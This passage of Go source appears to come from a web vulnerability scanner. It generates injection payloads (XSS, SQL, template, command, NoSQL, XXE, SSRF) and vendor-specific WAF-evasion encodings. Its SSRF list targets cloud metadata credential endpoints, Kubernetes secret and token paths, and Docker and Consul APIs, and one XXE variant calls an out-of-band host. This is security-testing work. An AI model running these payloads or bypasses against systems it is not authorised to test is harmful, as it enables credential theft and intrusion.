// detected vendor's preferred encodings/transforms. Each variant keeps the
// original detection signal so verification still works, but carries a distinct
// semantic key so it survives dedupe and is actually sent on the wire.
func wafEvasionVariants(in Input, base []Payload) []Payload {
	if !in.WAF.AllowEvasion {
		return nil
	}
	vendor := strings.TrimSpace(in.WAF.Vendor)
	if vendor == "" && !in.WAF.CautiousModeRecommended {
		return nil
	}
	if vendor == "" {
		vendor = "generic"
	}
	var out []Payload
	for _, p := range base {
		if p.IsControl || p.IsNegativeControl || p.WAFAdapted {
			continue
		}
		if p.Family != "xss" && p.Family != "sqli" && p.Family != "ssti" && p.Family != "command_injection" &&
			p.Family != "ssrf" && p.Family != "lfi" && p.Family != "xxe" && p.Family != "nosql" {
			continue
		}
		for _, variant := range wafVariantsForPayload(p.Value, p.Family, vendor) {
			variant.value, variant.enc = adjustWAFForTransport(p.Value, variant.value, variant.enc, in.Profile.ParameterLocation)
			if variant.value == p.Value || variant.value == "" {
				continue
			}
			v := p
			v.Value = variant.value
			v.Encoding = variant.enc
			v.WAFAdapted = true
			v.WAFVendor = vendor
			v.Technique = TechniqueWAFMutation
			v.Mutations = append(append([]MutationSpec{}, p.Mutations...), MutationSpec{Layer: "waf", Technique: variant.enc})
			v.Variant = p.Variant + "_waf_" + sanitizeVendor(vendor) + "_" + variant.enc
			v.SelectionReason = p.SelectionReason + "; WAF bypass for " + vendor + " (" + variant.enc + ")"
			v.SemanticKey = semanticKey(p) + "|waf:" + sanitizeVendor(vendor) + ":" + variant.enc
			out = append(out, v)
		}
	}
	return out
}

func wafVariantsForPayload(value, family, vendor string) []struct {
	value string
	enc   string
} {
	v := strings.ToLower(vendor)
	var out []struct {
		value string
		enc   string
	}
	add := func(val, enc string) {
		if val != "" && val != value {
			out = append(out, struct{ value, enc string }{val, enc})
		}
	}
	switch family {
	case "sqli", "nosql":
		add(deterministicCaseMix(commentSplit(value)), "comment_case")
		add(wafintel.ApplyEncoding(value, "url"), "url")
		add(wafintel.ApplyEncoding(value, "double_url"), "double_url")
		add(wafintel.EncodingCascade(value, "unicode", "url"), "unicode_url")
		add(wafintel.ApplyEncoding(value, "unicode_nfkc"), "unicode_nfkc")
		if strings.Contains(v, "modsecurity") || strings.Contains(v, "aws") {
			add(wafintel.ApplyEncoding(value, "hex"), "hex")
		}
	case "command_injection":
		if strings.Contains(value, " ") && !looksLikeWindowsCommand(value) {
			add(strings.ReplaceAll(value, " ", "${IFS}"), "ifs_substitution")
		}
		add(wafintel.ApplyEncoding(value, "url"), "url")
	case "xss", "ssti":
		add(wafintel.ApplyEncoding(value, "unicode_nfkc"), "unicode_nfkc")
		switch {
		case strings.Contains(v, "cloudflare") || strings.Contains(v, "imperva"):
			add(wafintel.ApplyEncoding(value, "unicode"), "unicode")
			add(wafintel.EncodingCascade(value, "unicode", "url"), "unicode_url")
		case strings.Contains(v, "akamai"):
			add(wafintel.ApplyEncoding(value, "html_entity"), "html_entity")
		default:
			add(wafintel.ApplyEncoding(value, "html_entity"), "html_entity")
			add(wafintel.ApplyEncoding(value, "url"), "url")
		}
	case "ssrf", "lfi":
		add(wafintel.ApplyEncoding(value, "url"), "url")
		add(wafintel.ApplyEncoding(wafintel.ApplyEncoding(value, "url"), "double_url"), "double_url")
	case "xxe":
		add(strings.ReplaceAll(value, "<", "&#60;"), "html_entity")
	}
	return out
}

func adjustWAFForTransport(original, transformed, encoding, location string) (string, string) {
	location = strings.ToLower(strings.TrimSpace(location))
	transportEncodes := location == "" || location == "query" || location == "form" ||
		location == "multipart" || location == "path"
	if !transportEncodes {
		return transformed, encoding
	}
	// Query/form/path builders already apply one URL-encoding layer. Emitting a
	// pre-encoded "url" clone would actually become double-encoded, while the
	// ordinary raw payload already receives the desired single layer.
	switch encoding {
	case "url":
		return "", ""
	case "double_url":
		return wafintel.ApplyEncoding(original, "url"), "double_url"
	case "unicode_url":
		return wafintel.ApplyEncoding(original, "unicode"), "unicode_url"
	default:
		return transformed, encoding
	}
}

func deterministicCaseMix(value string) string {
	var b strings.Builder
	b.Grow(len(value))
	upper := true
	for _, r := range value {
		if r >= 'a' && r <= 'z' {
			if upper {
				r -= 'a' - 'A'
			}
			upper = !upper
		} else if r >= 'A' && r <= 'Z' {
			if !upper {
				r += 'a' - 'A'
			}
			upper = !upper
		}
		b.WriteRune(r)
	}
	return b.String()
}

func looksLikeWindowsCommand(value string) bool {
	lower := strings.ToLower(strings.TrimSpace(value))
	return strings.Contains(lower, "cmd /") || strings.Contains(lower, "ping -n") ||
		strings.Contains(lower, "set /a") || strings.Contains(lower, " set ") ||
		strings.Contains(lower, "%comspec%") || strings.Contains(lower, "call %") ||
		strings.Contains(lower, "powershell") ||
		strings.HasPrefix(lower, "& dir") || strings.HasPrefix(lower, "& set") ||
		strings.HasPrefix(lower, "& whoami") || strings.HasPrefix(lower, "| whoami") ||
		strings.HasPrefix(lower, "|| whoami") || strings.HasPrefix(lower, "& c\"\"")
}

// transformForWAF returns a vendor/family-appropriate, transport-safe evasion of
// the payload along with a short encoding label.
func transformForWAF(value, family, vendor string) (string, string) {
	variants := wafVariantsForPayload(value, family, vendor)
	if len(variants) == 0 {
		return "", ""
	}
	return variants[0].value, variants[0].enc
}

func commentSplit(s string) string {
	return strings.ReplaceAll(s, " ", "/**/")
}

func sanitizeVendor(v string) string {
	return strings.ReplaceAll(strings.ToLower(strings.TrimSpace(v)), " ", "_")
}

// ---------------------------------------------------------------------------
// Payload constructors
// ---------------------------------------------------------------------------

func xssPayload(p reflection.ReflectionProfile, variant, value, signal string, priority, cost int) Payload {
	return Payload{
		Value: value, VulnClass: "xss", Variant: variant, Family: "xss",
		ExpectedSignal: signal, Encoding: "none", Priority: priority, NoiseLevel: "medium",
		BudgetCost: cost, VerificationStrategy: "reflection_context_verify",
		SelectionReason: "reflection in " + string(p.Context) + " context",
		RequiredContext: string(p.Context), RiskLevel: "active",
	}
}

func sqliPayload(p reflection.ReflectionProfile, variant, value, signal string, priority, cost int) Payload {
	return Payload{
		Value: value, VulnClass: "sqli", Variant: variant, Family: "sqli",
		ExpectedSignal: signal, Encoding: "none", Priority: priority, NoiseLevel: "medium",
		BudgetCost: cost, VerificationStrategy: "differential_true_false",
		SelectionReason: "database hint or reflection context for sqli",
		RequiredContext: string(p.Context), RiskLevel: "active",
	}
}

func sstiPayload(p reflection.ReflectionProfile, variant, value, signal string, priority, cost int) Payload {
	return Payload{
		Value: value, VulnClass: "ssti", Variant: variant, Family: "ssti",
		ExpectedSignal: signal, Encoding: "none", Priority: priority, NoiseLevel: "medium",
		BudgetCost: cost, VerificationStrategy: "template_eval_compare",
		SelectionReason: "framework hint supports template injection",
		RequiredContext: string(p.Context), RiskLevel: "active",
	}
}

func cmdPayload(p reflection.ReflectionProfile, variant, value, signal string, priority, cost int) Payload {
	return Payload{
		Value: value, VulnClass: "command_injection", Variant: variant, Family: "command_injection",
		ExpectedSignal: signal, Encoding: "none", Priority: priority, NoiseLevel: "high",
		BudgetCost: cost, VerificationStrategy: "output_diff",
		SelectionReason: "shell metachar probe for command injection",
		RequiredContext: string(p.Context), RiskLevel: "active",
	}
}

// ---------------------------------------------------------------------------
// Family gating (technology aware)
// ---------------------------------------------------------------------------

// techUnknown reports whether fingerprinting failed to identify the backend
// stack. This is extremely common in practice (CDN/WAF in front, minimal
// response headers, SPA front-ends). When the stack is unknown we must NOT skip
// injection families — doing so silently disabled SQLi/SSTI/command-injection
// testing on most real-world targets. We test broadly and let response signals
// (SQL errors, template evaluation, timing) decide.
func techUnknown(in Input) bool {
	return strings.TrimSpace(in.Tech.Database) == "" &&
		strings.TrimSpace(in.Tech.BackendLanguage) == "" &&
		strings.TrimSpace(in.Tech.Framework) == ""
}

func shouldIncludeSQLi(in Input) bool {
	// A technology fingerprint can rank database-specific payloads, but it
	// cannot prove that a request parameter never reaches SQL. Go, Node and
	// other services routinely call relational databases. Treating a
	// non-database fingerprint as an exclusion silently removed error,
	// boolean and time-based SQLi coverage from otherwise valid parameters.
	// The strict SQLi verifier, not a technology guess, is the false-positive
	// boundary.
	return true
}

func shouldIncludeSSTI(in Input) bool {
	return true
}

func shouldIncludeCmdInj(in Input) bool {
	return true
}

func skippedFamilies(in Input, candidates []Payload) []SkipFamily {
	present := map[string]bool{}
	for _, c := range candidates {
		present[c.Family] = true
	}
	var skipped []SkipFamily
	if !present["sqli"] {
		skipped = append(skipped, SkipFamily{Family: "sqli", Reason: skipSQLiReason(in)})
	}
	if !present["ssti"] {
		skipped = append(skipped, SkipFamily{Family: "ssti", Reason: skipSSTIReason(in)})
	}
	if !present["xss"] && in.Profile.ReflectionKind != reflection.ReflectionRemoved {
		skipped = append(skipped, SkipFamily{Family: "xss", Reason: "no injectable reflection context detected"})
	}
	if !present["command_injection"] {
		skipped = append(skipped, SkipFamily{Family: "command_injection", Reason: "no shell metachar availability or backend hint"})
	}
	return skipped
}

func skipSQLiReason(in Input) string {
	if in.Profile.ReflectionKind == reflection.ReflectionRemoved {
		return "parameter reflection removed"
	}
	return "no database or backend hint for SQLi"
}

func skipSSTIReason(in Input) string {
	return "framework fingerprint does not suggest template engine"
}

func applyProfileCompatibility(payloads []Payload, profile reflection.ReflectionProfile) []Payload {
	blocked := normalizedTokens(profile.BlockedChars)
	out := make([]Payload, 0, len(payloads))
	for _, p := range payloads {
		if strings.TrimSpace(p.Value) == "" {
			continue
		}
		if p.IsControl || p.IsNegativeControl || len(blocked) == 0 || !containsBlockedToken(p.Value, blocked) {
			out = append(out, p)
		}
	}
	return out
}

func normalizedTokens(items []string) []string {
	seen := map[string]struct{}{}
	out := make([]string, 0, len(items))
	for _, item := range items {
		item = strings.TrimSpace(item)
		if item == "" {
			continue
		}
		if _, ok := seen[item]; ok {
			continue
		}
		seen[item] = struct{}{}
		out = append(out, item)
	}
	return out
}

func containsBlockedToken(value string, blocked []string) bool {
	for _, token := range blocked {
		if strings.Contains(value, token) {
			return true
		}
	}
	return false
}

func compatibilitySkips(before, after []Payload, profile reflection.ReflectionProfile) []SkipFamily {
	if len(profile.BlockedChars) == 0 {
		return nil
	}
	return missingFamilySkips(before, after, "all payload shapes require characters removed by the target")
}

func learningSkips(before, after []Payload, learn LearningProfile) []SkipFamily {
	if len(learn.Blocked) == 0 {
		return nil
	}
	return missingFamilySkips(before, after, "family disabled by endpoint learning profile")
}

func missingFamilySkips(before, after []Payload, reason string) []SkipFamily {
	had := map[string]bool{}
	has := map[string]bool{}
	for _, p := range before {
		if p.Family != "" && p.Family != "control" {
			had[p.Family] = true
		}
	}
	for _, p := range after {
		if p.Family != "" && p.Family != "control" {
			has[p.Family] = true
		}
	}
	var out []SkipFamily
	for family := range had {
		if !has[family] {
			out = append(out, SkipFamily{Family: family, Reason: reason})
		}
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Family < out[j].Family })
	return out
}

func appendUniqueSkips(base []SkipFamily, extra ...SkipFamily) []SkipFamily {
	seen := map[string]struct{}{}
	for _, skip := range base {
		seen[skip.Family+"\x00"+skip.Reason] = struct{}{}
	}
	for _, skip := range extra {
		key := skip.Family + "\x00" + skip.Reason
		if skip.Family == "" || skip.Reason == "" {
			continue
		}
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		base = append(base, skip)
	}
	return base
}

func applyLearning(payloads []Payload, learn LearningProfile) []Payload {
	blocked := normalizedSet(learn.Blocked)
	noisy := normalizedSet(learn.Noisy)
	falsePositive := normalizedSet(learn.FalsePositive)
	worked := normalizedSet(learn.Worked)
	out := make([]Payload, 0, len(payloads))
	for _, p := range payloads {
		family := strings.ToLower(p.Family)
		key := strings.ToLower(p.SemanticKey)
		legacyKey := strings.ToLower(legacySemanticKey(p))
		if !p.IsControl && !p.IsNegativeControl &&
			(blocked[family] || blocked[key] || blocked[legacyKey]) {
			continue
		}
		if noisy[family] || noisy[key] || noisy[legacyKey] {
			p.Priority -= 12
			p.SelectionReason += "; deprioritized by noisy history"
		}
		// A family-level false positive must not permanently disable the entire
		// vulnerability class. Exact semantic keys are suppressed; family-level
		// history is strongly deprioritized but remains available for deep scans.
		if falsePositive[key] || falsePositive[legacyKey] {
			continue
		}
		if falsePositive[family] {
			p.Priority -= 20
			p.SelectionReason += "; deprioritized by false-positive history"
		}
		if worked[family] || worked[key] || worked[legacyKey] {
			p.Priority += 10
			p.SelectionReason += "; boosted by prior success"
		}
		p.Priority = clampPriority(p.Priority)
		out = append(out, p)
	}
	return out
}

func semanticDedupe(payloads []Payload) []Payload {
	seen := map[string]struct{}{}
	wireSeen := map[string]struct{}{}
	var out []Payload
	for _, p := range payloads {
		if _, ok := seen[p.SemanticKey]; ok {
			continue
		}
		wireKey := requestDedupeKey(p)
		if _, ok := wireSeen[wireKey]; ok {
			continue
		}
		seen[p.SemanticKey] = struct{}{}
		wireSeen[wireKey] = struct{}{}
		out = append(out, p)
	}
	return out
}

func requestDedupeKey(p Payload) string {
	return strings.Join([]string{
		strings.ToLower(strings.TrimSpace(p.Family)),
		strings.ToLower(strings.TrimSpace(p.VulnClass)),
		strings.ToLower(strings.TrimSpace(p.Value)),
		strings.ToLower(strings.TrimSpace(p.Encoding)),
		strings.ToLower(strings.TrimSpace(p.WAFVendor)),
	}, "|")
}

func semanticKey(p Payload) string {
	effect := strings.Join([]string{
		strings.ToLower(p.VulnClass),
		strings.ToLower(p.Family),
		strings.ToLower(p.ExpectedSignal),
		strings.ToLower(p.VerificationStrategy),
		strings.ToLower(p.Encoding),
		shortPayloadHash(p.Value),
	}, ":")
	if p.IsControl || p.IsNegativeControl {
		effect = "control:" + strings.ToLower(p.Variant) + ":" + shortPayloadHash(p.Value)
	}
	return effect
}

func legacySemanticKey(p Payload) string {
	if p.IsControl || p.IsNegativeControl {
		return "control:" + p.Variant
	}
	return p.VulnClass + ":" + p.Family + ":" + p.ExpectedSignal
}

func shortPayloadHash(value string) string {
	sum := sha256.Sum256([]byte(strings.TrimSpace(value)))
	return fmt.Sprintf("%x", sum[:8])
}

func normalizedSet(items []string) map[string]bool {
	out := make(map[string]bool, len(items))
	for _, item := range items {
		item = strings.ToLower(strings.TrimSpace(item))
		if item != "" {
			out[item] = true
		}
	}
	return out
}

func sortPayloads(payloads []Payload) {
	sort.SliceStable(payloads, func(i, j int) bool {
		if payloads[i].Priority != payloads[j].Priority {
			return payloads[i].Priority > payloads[j].Priority
		}
		if payloads[i].BudgetCost != payloads[j].BudgetCost {
			return payloads[i].BudgetCost < payloads[j].BudgetCost
		}
		if payloads[i].Family != payloads[j].Family {
			return payloads[i].Family < payloads[j].Family
		}
		if payloads[i].Variant != payloads[j].Variant {
			return payloads[i].Variant < payloads[j].Variant
		}
		return payloads[i].SemanticKey < payloads[j].SemanticKey
	})
}

func selectPayloads(payloads []Payload, limit int) ([]Payload, int) {
	selected := make([]Payload, 0, len(payloads))
	offensive := make([]Payload, 0, len(payloads))
	for _, p := range payloads {
		if p.IsControl || p.IsNegativeControl {
			selected = append(selected, p)
			continue
		}
		offensive = append(offensive, p)
	}
	if limit <= 0 {
		selected = append(selected, offensive...)
		used := payloadCost(offensive)
		sortPayloads(selected)
		return selected, used
	}

	type familyChoice struct {
		family string
		index  int
		p      Payload
		score  int
	}
	buckets := map[string][]Payload{}
	for _, p := range offensive {
		buckets[p.Family] = append(buckets[p.Family], p)
	}
	choices := make([]familyChoice, 0, len(buckets))
	for family, bucket := range buckets {
		best := 0
		bestScore := coverageScore(bucket[0])
		for i := 1; i < len(bucket); i++ {
			score := coverageScore(bucket[i])
			if score > bestScore || (score == bestScore && bucket[i].BudgetCost < bucket[best].BudgetCost) {
				best, bestScore = i, score
			}
		}
		choices = append(choices, familyChoice{family: family, index: best, p: bucket[best], score: bestScore})
	}
	sort.Slice(choices, func(i, j int) bool {
		if choices[i].score != choices[j].score {
			return choices[i].score > choices[j].score
		}
		return choices[i].family < choices[j].family
	})

	used := 0
	chosen := map[string]struct{}{}
	selectedOriginalByKey := map[string]bool{}
	for _, choice := range choices {
		pair, pairCost, ok := wafPairForSelection(choice.p, offensive, selectedOriginalByKey)
		if !ok || used+pairCost > limit {
			continue
		}
		for _, p := range pair {
			if _, ok := chosen[p.SemanticKey]; ok {
				continue
			}
			selected = append(selected, p)
			used += p.BudgetCost
			chosen[p.SemanticKey] = struct{}{}
			if !p.WAFAdapted {
				selectedOriginalByKey[baseVariantKey(p)] = true
			}
		}
	}
	for _, p := range offensive {
		if _, ok := chosen[p.SemanticKey]; ok {
			continue
		}
		pair, pairCost, ok := wafPairForSelection(p, offensive, selectedOriginalByKey)
		if !ok || used+pairCost > limit {
			continue
		}
		for _, candidate := range pair {
			if _, ok := chosen[candidate.SemanticKey]; ok {
				continue
			}
			selected = append(selected, candidate)
			used += candidate.BudgetCost
			chosen[candidate.SemanticKey] = struct{}{}
			if !candidate.WAFAdapted {
				selectedOriginalByKey[baseVariantKey(candidate)] = true
			}
		}
	}
	sortPayloads(selected)
	return selected, used
}

func wafPairForSelection(p Payload, offensive []Payload, selectedOriginalByKey map[string]bool) ([]Payload, int, bool) {
	if !p.WAFAdapted {
		return []Payload{p}, p.BudgetCost, true
	}
	key := baseVariantKey(p)
	if selectedOriginalByKey[key] {
		return []Payload{p}, p.BudgetCost, true
	}
	original, ok := findOriginalForWAFAdapted(p, offensive)
	if !ok {
		return nil, 0, false
	}
	return []Payload{original, p}, original.BudgetCost + p.BudgetCost, true
}

func findOriginalForWAFAdapted(adapted Payload, offensive []Payload) (Payload, bool) {
	key := baseVariantKey(adapted)
	for _, p := range offensive {
		if p.WAFAdapted || p.IsControl || p.IsNegativeControl {
			continue
		}
		if baseVariantKey(p) == key {
			return p, true
		}
	}
	return Payload{}, false
}

func baseVariantKey(p Payload) string {
	variant := p.Variant
	if idx := strings.Index(variant, "_waf_"); idx >= 0 {
		variant = variant[:idx]
	}
	return strings.Join([]string{
		strings.ToLower(strings.TrimSpace(p.Family)),
		strings.ToLower(strings.TrimSpace(p.VulnClass)),
		strings.ToLower(strings.TrimSpace(p.ExpectedSignal)),
		strings.ToLower(strings.TrimSpace(p.VerificationStrategy)),
		strings.ToLower(strings.TrimSpace(variant)),
	}, "|")
}

func coverageScore(p Payload) int {
	return p.Priority*10 - p.BudgetCost*25
}

func payloadCost(payloads []Payload) int {
	used := 0
	for _, p := range payloads {
		used += p.BudgetCost
	}
	return used
}

func estimateRequests(payloads []Payload) int {
	total := 0
	for _, p := range payloads {
		total += p.EstimatedRequests
	}
	return total
}

func estimatedRequestsForPayload(pl Payload) int {
	if pl.IsControl || pl.IsNegativeControl {
		return 1
	}
	switch {
	case strings.Contains(pl.VerificationStrategy, "timing"):
		return 3
	case strings.Contains(pl.VerificationStrategy, "oast") || strings.Contains(pl.ExpectedSignal, "oast"):
		return 1
	case strings.Contains(pl.VerificationStrategy, "differential"):
		return 2
	case strings.Contains(pl.VerificationStrategy, "template_eval"):
		return 2
	default:
		return 1
	}
}

func inferTechnique(pl Payload) Technique {
	if pl.IsControl || pl.IsNegativeControl {
		return TechniqueBaseline
	}
	if pl.WAFAdapted {
		return TechniqueWAFMutation
	}
	haystack := strings.ToLower(pl.VerificationStrategy + " " + pl.ExpectedSignal + " " + pl.Variant)
	switch {
	case strings.Contains(haystack, "oast") || strings.Contains(haystack, "blind"):
		return TechniqueOAST
	case strings.Contains(haystack, "timing") || strings.Contains(haystack, "sleep") || strings.Contains(haystack, "delay"):
		return TechniqueTiming
	case pl.Family == "xss":
		return TechniqueContext
	default:
		return TechniqueDifferential
	}
}

func inferProbeRole(pl Payload) ProbeRole {
	switch {
	case pl.IsNegativeControl:
		return ProbeRoleNegative
	case pl.IsControl:
		return ProbeRoleBaseline
	case strings.Contains(strings.ToLower(pl.ExpectedSignal), "oast"):
		return ProbeRoleOAST
	default:
		return ProbeRolePositive
	}
}

func transportEncodingForProfile(profile reflection.ReflectionProfile) string {
	loc := strings.ToLower(strings.TrimSpace(profile.ParameterLocation))
	ct := strings.ToLower(strings.TrimSpace(profile.ContentType))
	switch {
	case strings.Contains(ct, "json") || loc == "json" || loc == "graphql":
		return "json"
	case loc == "query" || loc == "form" || loc == "path":
		return loc
	case loc == "multipart":
		return "multipart"
	case loc == "header" || loc == "cookie":
		return loc
	default:
		return "raw"
	}
}

func buildTestCases(payloads []Payload) []TestCase {
	out := make([]TestCase, 0, len(payloads))
	for _, p := range payloads {
		if p.Family != "sqli" {
			continue
		}
		steps := []ProbeStep{
			{
				Role:              p.ProbeRole,
				Payload:           p,
				ExpectedSignal:    p.ExpectedSignal,
				EstimatedRequests: p.EstimatedRequests,
			},
		}
		out = append(out, TestCase{
			ID:                p.SemanticKey,
			VulnClass:         p.VulnClass,
			Technique:         p.Technique,
			ProbeRole:         p.ProbeRole,
			Steps:             steps,
			Payloads:          []Payload{p},
			EstimatedRequests: p.EstimatedRequests,
			ShadowOnly:        true,
		})
	}
	return out
}

func compareShadow(payloads []Payload, testCases []TestCase, budgetUsed int) ShadowComparison {
	shadow := ShadowComparison{
		LegacyPayloads: len(payloads), TestCases: len(testCases),
		LegacyBudget: budgetUsed, EstimatedRequests: estimateRequests(payloads),
	}
	controls := map[string]bool{}
	for _, p := range payloads {
		if p.Family == "sqli" {
			shadow.SQLiLegacyPayloads++
		}
		if p.IsControl || p.IsNegativeControl {
			controls[p.SemanticKey] = true
		}
	}
	shadow.SQLiTestCases = len(testCases)
	for _, tc := range testCases {
		for _, p := range tc.Payloads {
			if p.ControlFor != "" && !controls[p.ControlFor] {
				shadow.OrphanControls++
			}
		}
	}
	return shadow
}

func UpdateLearning(learn LearningProfile, family, outcome string) LearningProfile {
	switch outcome {
	case "worked":
		learn.Worked = appendUnique(learn.Worked, family)
	case "blocked":
		learn.Blocked = appendUnique(learn.Blocked, family)
	case "noisy":
		learn.Noisy = appendUnique(learn.Noisy, family)
	case "false_positive":
		learn.FalsePositive = appendUnique(learn.FalsePositive, family)
	}
	return learn
}

func appendUnique(items []string, v string) []string {
	for _, i := range items {
		if i == v {
			return items
		}
	}
	return append(items, v)
}

// GenerateGroupB builds SSRF/LFI/XXE payloads with optional WAF-adapted variants.
func GenerateGroupB(vulnClass, oastURL string, waf WAFHints) []Payload {
	var base []Payload
	switch vulnClass {
	case "ssrf":
		base = ssrfPayloads(oastURL)
	case "lfi":
		base = lfiPayloads(oastURL)
	case "xxe":
		base = xxePayloads(oastURL)
	default:
		return nil
	}
	in := Input{Profile: reflection.ReflectionProfile{Context: reflection.ContextUnknown, ParameterLocation: "raw"}, WAF: waf}
	all := append(base, wafEvasionVariants(in, base)...)
	for i := range all {
		all[i] = normalizePayload(all[i], in.Profile)
	}
	all = semanticDedupe(all)
	sortPayloads(all)
	return all
}

func ssrfPayloads(oastURL string) []Payload {
	probes := []struct {
		variant, value, signal string
		priority               int
	}{
		{"internal_ip", "http://127.0.0.1/", "internal_ip", 80},
		{"internal_localhost", "http://localhost/", "internal_ip", 80},
		{"internal_ip_decimal", "http://2130706433/", "internal_ip", 78},
		{"internal_ip_hex", "http://0x7f000001/", "internal_ip", 78},
		{"internal_ip_octal", "http://0177.0.0.1/", "internal_ip", 78},
		{"internal_ip_ipv6", "http://[::1]/", "internal_ip", 77},
		{"internal_ip_ipv6_compat", "http://[0000:0000:0000:0000:0000:ffff:7f00:0001]/", "internal_ip", 76},
		{"internal_ip_zero", "http://0.0.0.0/", "internal_ip", 76},
		{"internal_ip_short", "http://127.1/", "internal_ip", 75},
		{"internal_127_port", "http://127.0.0.1:8080/", "internal_ip", 78},
		{"internal_localhost_port", "http://localhost:8080/", "internal_ip", 78},
		{"aws_metadata", "http://169.254.169.254/latest/meta-data/", "aws_metadata", 85},
		{"aws_iam_credentials", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_metadata", 85},
		{"aws_dynamic_identity", "http://169.254.169.254/latest/dynamic/instance-identity/document", "aws_metadata", 84},
		{"aws_metadata_decimal", "http://2852039166/latest/meta-data/", "aws_metadata", 83},
		{"aws_metadata_hex", "http://0xa9fea9fe/latest/meta-data/", "aws_metadata", 83},
		{"aws_metadata_octal", "http://0251.0372.0251.0372/latest/meta-data/", "aws_metadata", 83},
		{"aws_imds_v2_token", "http://169.254.169.254/latest/api/token", "aws_metadata", 82},
		{"gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/", "gcp_metadata", 82},
		{"gcp_token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "gcp_metadata", 82},
		{"azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_metadata", 82},
		{"azure_token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "azure_metadata", 82},
		{"alibaba_metadata", "http://100.100.100.200/latest/meta-data/", "alibaba_metadata", 80},
		{"do_metadata", "http://169.254.169.254/metadata/v1.json", "do_metadata", 80},
		{"oracle_metadata", "http://192.0.0.192/latest/meta-data/", "oracle_metadata", 80},
		{"kubernetes_internal_secrets", "https://kubernetes.default.svc/api/v1/namespaces/default/secrets", "internal_ip", 79},
		{"kubernetes_service_token", "file:///var/run/secrets/kubernetes.io/serviceaccount/token", "internal_ip", 79},
		{"docker_api", "http://127.0.0.1:2375/version", "internal_ip", 76},
		{"consul_api", "http://127.0.0.1:8500/v1/agent/self", "internal_ip", 76},
		{"protocol_smuggling_redis", "gopher://127.0.0.1:6379/_PING%0d%0a", "protocol_smuggling", 70},
		{"protocol_smuggling_dict", "dict://127.0.0.1:11211/stat", "protocol_smuggling", 70},
		{"protocol_smuggling_ldap", "ldap://127.0.0.1:389/o=base", "protocol_smuggling", 70},
		{"dns_rebind_nip_io", "http://127.0.0.1.nip.io/", "internal_ip", 75},
		{"dns_rebind_imds_nip_io", "http://169.254.169.254.nip.io/latest/meta-data/", "aws_metadata", 75},
	}
	var out []Payload
	for _, pr := range probes {
		out = append(out, groupBPayload("ssrf", pr.variant, pr.value, pr.signal, pr.priority, 2))
	}
	if strings.TrimSpace(oastURL) != "" {
		out = append(out, groupBPayload("ssrf", "blind_oast", oastURL, "blind_oast", 75, 2))
	}
	return out
}

func lfiPayloads(oastURL string) []Payload {
	var out []Payload
	for i, p := range deeptraversal.Payloads() {
		priority := 84 - i
		if priority < 58 {
			priority = 58
		}
		out = append(out, groupBPayload("lfi", p.Variant, p.Value, p.Signal, priority, 2))
	}
	if strings.TrimSpace(oastURL) != "" {
		out = append(out, groupBPayload("lfi", "rfi_oast", oastURL, "rfi_oast", 72, 2))
	}
	return out
}

func nosqlPayloads(p reflection.ReflectionProfile) []Payload {
	var out []Payload
	probes := nosql.ProbesForTarget(p.Parameter, p.EndpointURL, p.ContentType, p.Method)
	for _, probe := range probes {
		prio := nosqlPriority(probe)
		out = append(out, Payload{
			Value: nosqlPayloadValue(probe, p.Parameter), VulnClass: "nosql", Variant: probe.Name, Family: "nosql",
			ExpectedSignal: probe.Signal, Priority: prio, BudgetCost: 2,
			VerificationStrategy: "differential_compare", NoiseLevel: "medium",
			TransportEncoding: nosqlTransportEncoding(probe),
		})
	}
	return out
}

func nosqlPayloadValue(probe nosql.Probe, parameter string) string {
	if probe.Value != "" {
		return probe.Value
	}
	if probe.Mode == "bracket_query" {
		op := "$ne"
		if probe.Name == "bracket_gt" {
			op = "$gt"
		}
		return parameter + "[" + op + "]=akca"
	}
	return probe.Name
}

func nosqlPriority(probe nosql.Probe) int {
	switch probe.Signal {
	case "auth_bypass":
		return 78
	case "operator_injection":
		return 72
	case "regex_injection":
		return 68
	case "where_injection":
		return 64
	case "js_injection":
		return 62
	case "bracket_injection":
		return 66
	default:
		return 60
	}
}

func nosqlTransportEncoding(probe nosql.Probe) string {
	switch probe.Mode {
	case "json_body":
		return "json"
	case "bracket_query":
		return "query"
	default:
		return ""
	}
}

func shouldIncludeNoSQLi(in Input) bool {
	if techUnknown(in) {
		// Secure default: when tech stack is unknown, enable NoSQLi if the
		// request content type is JSON (highly indicative of NoSQL APIs) or
		// empty, to safely extend coverage while keeping false positive/budget
		// costs minimal on legacy form endpoints.
		ct := strings.ToLower(in.Profile.ContentType)
		return ct == "" || strings.Contains(ct, "json")
	}
	return true
}

func xxePayloads(oastURL string) []Payload {
	out := []Payload{
		groupBPayload("xxe", "classic_entity", `<!DOCTYPE foo [<!ENTITY xxe "AKCA_XXE_TEST">]><root>&xxe;</root>`, "classic_entity", 84, 2),
		// SOAP XXE payload must be standard-compliant. DOCTYPE must be placed before the root soap:Envelope element.
		groupBPayload("xxe", "soap_xxe", `<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY xxe "AKCA_XXE_TEST">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>`, "soap_xxe", 78, 2),
		groupBPayload("xxe", "svg_xxe", `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe "AKCA_XXE_TEST" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`, "classic_entity", 80, 2),
	}
	if strings.TrimSpace(oastURL) != "" {
		body := `<!DOCTYPE foo [<!ENTITY % x SYSTEM "` + oastURL + `"><!ENTITY call SYSTEM "file:///nonexistent">%x;]><root/>`
		out = append(out, groupBPayload("xxe", "blind_oast", body, "blind_oast", 76, 2))
	}
	return out
}

func groupBPayload(vulnClass, variant, value, signal string, priority, cost int) Payload {
	return Payload{
		Value: value, VulnClass: vulnClass, Variant: variant, Family: vulnClass,
		ExpectedSignal: signal, Encoding: "none", Priority: priority, NoiseLevel: "medium",
		BudgetCost: cost, VerificationStrategy: "differential_compare",
		SelectionReason: vulnClass + " group B probe", RiskLevel: "active",
	}
}
